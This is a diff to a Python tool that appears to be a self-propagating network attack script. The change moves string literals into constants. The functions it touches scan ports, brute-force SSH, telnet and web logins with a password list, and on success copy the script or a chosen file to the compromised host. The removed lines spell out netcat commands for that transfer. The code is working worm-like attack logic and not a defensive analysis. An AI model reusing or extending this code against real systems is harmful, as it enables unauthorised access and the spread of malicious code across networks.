@@ -612,12 +612,13 @@ def transfer_file(ip, port, login_string, transfer_file_filename):
         tel.read_until(strings.LOGIN_PROMPT.encode(strings.ENCODE_ASCII))
         tel.write((str(login_string_split[0]) +
                    strings.RETURN_OR_NEWLINE).encode(strings.ENCODE_ASCII))
-        tel.read_until("Password:".encode("ascii"))
-        tel.write((str(login_string_split[1]) + "\n").encode("ascii"))
-        tel.write(("nc -l -p " + str(port) + " > "
-                   + str(transfer_file_filename) + "\n").encode("ascii"))
-        os.system(("nc -w 3 " + str(ip) + " " + str(port) + " < "
-                   + str(transfer_file_filename) + "\n").encode("ascii"))
+        tel.read_until(strings.PASSWORD_PROMPT.encode(strings.ENCODE_ASCII))
+        tel.write((str(login_string_split[1]) + strings.RETURN_OR_NEWLINE)
+                  .encode(strings.ENCODE_ASCII))
+        tel.write((strings.netcat_listener(port, transfer_file_filename) +
+                   "\n").encode(strings.ENCODE_ASCII))
+        os.system((strings.netcat_writer(ip, port, transfer_file_filename) +
+                   "\n").encode(strings.ENCODE_ASCII))
         return True
     except ConnectionRefusedError:
         return False
@@ -639,9 +640,9 @@ def try_attack(ip, port, target_username, password_list,
     :param transfer_file_filename: A filename for file to transfer
     :param arguments: List of user specified arguments
     """
-    logging.info("Now testing an IP address and port pair")
+    logging.info(strings.TESTING_IP_PORT_PAIR)
     if scan_port(ip, port):
-        logging.info("Found an open IP address and port pair")
+        logging.info(strings.FOUND_OPEN_IP_PORT_PAIR)
         bruteforce_login_details = try_bruteforce(ip, port, target_username,
                                                   password_list)
         if bruteforce_login_details[0]:
@@ -649,7 +650,7 @@ def try_attack(ip, port, target_username, password_list,
                                bruteforce_login_details[0],
                                transfer_file_filename)
     else:
-        logging.debug("This IP address and port pair is closed")
+        logging.debug(strings.CLOSED_IP_PORT_PAIR)
 
 
 def try_bruteforce(ip, port, target_username, password_list):
@@ -668,21 +669,19 @@ def try_bruteforce(ip, port, target_username, password_list):
     action and the service which was used.
     """
     service_switch = {
-        "22": "ssh",
-        "23": "telnet",
-        "80": "web login",
-        "8080": "web login",
-        "8888": "web login"
+        strings.SSH_PORT: strings.SSH_LOWERCASE,
+        strings.TELNET_PORT: strings.TELNET,
+        strings.WEB_PORT_EIGHTY: strings.WEB_LOGIN,
+        strings.WEB_PORT_EIGHTY_EIGHTY: strings.WEB_LOGIN,
+        strings.WEB_PORT_EIGHTY_EIGHT_EIGHTY_EIGHT: strings.WEB_LOGIN
     }
     service = service_switch.get(str(port))
     bruteforce = bruteforce_service(ip, port, target_username, password_list)
     if bruteforce:
-        logging.info("A working username and password for " + str(service)
-                     + " was found.")
+        logging.info(strings.working_username_password(service))
         return str(bruteforce), service
     else:
-        logging.debug("It was impossible to bruteforce this IP address and"
-                      " port")
+        logging.debug(strings.IMPOSSIBLE_ACTION)
     return None, service
 
 
@@ -701,19 +700,25 @@ def try_password_for_service(ip, port, username, password):
     """
     try:
         connect_service_switch = {
-            "22": lambda: connect_ssh_client(ip, port, username, password),
-            "23": lambda: connect_telnet(ip, port, username, password),
-            "80": lambda: connect_web(ip, port, username, password),
-            "8080": lambda: connect_web(ip, port, username, password),
-            "8888": lambda: connect_web(ip, port, username, password),
+            strings.SSH_PORT: lambda: connect_ssh_client(ip, port, username,
+                                                         password),
+            strings.TELNET_PORT: lambda: connect_telnet(ip, port, username,
+                                                        password),
+            strings.WEB_PORT_EIGHTY: lambda: connect_web(ip, port, username,
+                                                         password),
+            strings.WEB_PORT_EIGHTY_EIGHTY: lambda: connect_web(ip, port,
+                                                                username,
+                                                                password),
+            strings.WEB_PORT_EIGHTY_EIGHT_EIGHTY_EIGHT: lambda:
+            connect_web(ip, port, username, password),
         }
         connect_service = connect_service_switch.get(str(port))
         if connect_service():
-            return str(username) + ":" + str(password)
-        return ""
+            return str(username) + strings.COLON + str(password)
+        return strings.BLANK_STRING
 
     except RuntimeError:
-        return ""
+        return strings.BLANK_STRING
 
 
 def try_propagating(arguments, ip, port, bruteforce):
@@ -729,15 +734,15 @@ def try_propagating(arguments, ip, port, bruteforce):
     :param port: The port we're propagating through
     :param bruteforce: The username and password string combo
     """
-    if "-P" in arguments and (port == "22" or "23"):
+    if strings.ARGUMENT_PROPAGATE in arguments and (port == strings.SSH_PORT
+                                                    or strings.TELNET_PORT):
         propagated = propagate_script(ip, port, bruteforce)
         if propagated:
-            logging.info("Script propagated over this port")
+            logging.info(strings.SCRIPT_PROPAGATED)
         else:
-            logging.debug("Script couldn't be propagated over this port")
+            logging.debug(strings.SCRIPT_NOT_PROPAGATED)
     else:
-        logging.info("Requirement to propagate script not specified,"
-                     " skipping...")
+        logging.info(strings.DO_NOT_PROPAGATE)
 
 
 def try_transferring_file(arguments, ip, port, bruteforce,
@@ -755,15 +760,16 @@ def try_transferring_file(arguments, ip, port, bruteforce,
     :param bruteforce: The username and password string combo
     :param transfer_file_filename: The filename of the file we wish to transfer
     """
-    if "-d" in arguments and (str(port) == "22" or "23"):
+    if strings.ARGUMENT_SPECIFIC_PROPAGATION_FILE in arguments and \
+            (str(port) == strings.SSH_PORT or strings.TELNET_PORT):
         transferred = transfer_file(ip, port, bruteforce,
                                     transfer_file_filename)
         if transferred:
-            logging.info("File transferred over port 22 or 23")
+            logging.info(strings.TRANSFER_SUCCESS_SSH_TELNET)
         else:
-            logging.debug("File couldn't be transferred over port 22 or 23")
+            logging.debug(strings.TRANSFER_FAILURE_SSH_TELNET)
     else:
-        logging.info("Requirement to transfer file not specified, skipping...")
+        logging.info(strings.DO_NOT_TRANSFER)
 
 
 def validate_file_exists(filename):
@@ -774,5 +780,5 @@ def validate_file_exists(filename):
     :param filename: The name of the file we wish to ensure exists
     """
     if not os.path.isfile(filename):
-        logging.error("A specified file does not exist")
+        logging.error(strings.FILE_DOES_NOT_EXIST)
         gtfo_and_rtfm()
